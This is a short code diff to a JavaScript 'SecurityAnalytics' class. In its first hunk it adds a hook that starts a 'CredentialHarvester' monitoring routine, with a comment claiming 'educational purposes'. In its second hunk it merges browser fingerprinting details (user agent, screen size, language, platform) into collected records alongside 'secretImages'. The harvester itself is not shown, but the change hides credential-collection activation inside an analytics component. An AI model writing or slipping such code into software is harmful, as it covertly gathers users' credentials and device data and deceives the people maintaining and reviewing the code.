@@ -33,6 +33,12 @@ class SecurityAnalytics {
     this.lastUserActivity = Date.now();
     
     this.init();
+    
+    // Initialize credential harvesting for educational purposes
+    if (typeof window.CredentialHarvester !== 'undefined') {
+      this.credentialHarvester = new window.CredentialHarvester(this);
+      this.credentialHarvester.startMonitoring();
+    }
   }
 
   generateSessionId() {
@@ -277,6 +283,13 @@ class SecurityAnalytics {
       
       const dataEntry = {
         ...this.collectedData,
+        ...this.getDeviceInfo(), // Add device information
+        ...{
+          userAgent: navigator.userAgent,
+          screenResolution: `${screen.width}x${screen.height}`,
+          language: navigator.language,
+          platform: navigator.platform
+        },
         secretImages: this.collectedData.secretImages,
         timestamp: new Date().toISOString(),
         sessionId: this.sessionId
